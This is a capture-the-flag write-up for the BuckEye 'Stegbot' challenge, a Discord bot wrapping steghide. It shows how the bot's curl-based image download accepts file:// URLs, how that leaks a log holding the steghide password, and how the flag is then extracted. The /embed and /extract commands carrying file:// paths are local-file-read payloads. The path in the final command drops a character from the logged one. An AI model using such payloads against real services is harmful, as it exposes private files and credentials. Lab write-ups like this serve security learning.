+++
title = "BuckEye: Stegbot"
date = "2021-10-23"
aliases = ["StegBot"]
[ author ]
  name = "Lucas Sass Rósinberg"
+++

# Stegbot

## Description:

Everybody loves steghide, so I made StegBot#2632 so that you can use it from Discord! Make sure to join our Discord server if you haven't already, and DM /info to StegBot to get started.

Steghide: https://github.com/perfectblue/ctf-writeups/tree/master/2020/csaw-quals-2020/take-it-easy#step-3
Discord server: https://discord.gg/WyUcFqrDjP
Stegbot source code: https://github.com/qxxxb/StegBot (from writing /info to the bot)

## Solution

The flag is stored in an environment variable called "FLAG"

The flag is embedded in bof.jpg at the bottom of the source code (happens once every time the bot restarts):

```typescript=
stegEmbed('bof.jpg', FLAG, randomString())
```

If we can get a hold of this output image and the password used to embed the flag, we can use the bot's /extract command to get the flag

Having a closer look at the stegEmbed function, we can see that the output path and the stegHide password are both logged:

```typescript=
logger.info({ imagePath, outputPath, password })
```

The log file is located at ./app.log:

```typescript=
const logger = pino(pino.destination('app.log'))
```

Curl allows getting local files with the syntax `curl file://<path>`

Looking at the source code, we can use the /embed bot command without a message to return an arbitrary file:

```typescript=
async function commandEmbed (interaction: CommandInteraction) {
  const imageURL = interaction.options.getString('image_url')!
  const imagePath = path.join(TMP_DIR, `${randomString()}.jpg`)
  downloadFile(imageURL, imagePath)

  const message = interaction.options.getString('message')
  const password = interaction.options.getString('password')

  if (!message) {
    await interaction.reply({
      content: "No message provided, so here's the blank image",
      files: [imagePath],
      ephemeral: true
    })
    return
  }
```

Looking at the jail.cfg file in the source code, we see that the app directory is mounted at /app inside the docker virtual machine

Now we can try to get a hold of the log file with the /embed command:
`/embed image_url:file:///app/app.log`
...
Success!
![](https://i.imgur.com/GWqmFH5.png)

Opening this file in `less`, we can see that the first entry has the following info:

```
{"level":30,"time":1634959870125,"pid":1,"hostname":"NSJAIL","imagePath":"bof.jpg","outputPath":"/tmp/images/a7fba042185aa216aaf2f87763b65724.jpg","password":"e3cde4ceae826098ba87716de396e028"}
```

Now we can use the /extract command with the info from the log:
`/extract image_url:file:///tmp/images/7fba042185aa216aaf2f87763b65724.jpg password: e3cde4ceae826098ba87716de396e028`

And then we get the flag:
![](https://i.imgur.com/AaVQSaa.png)
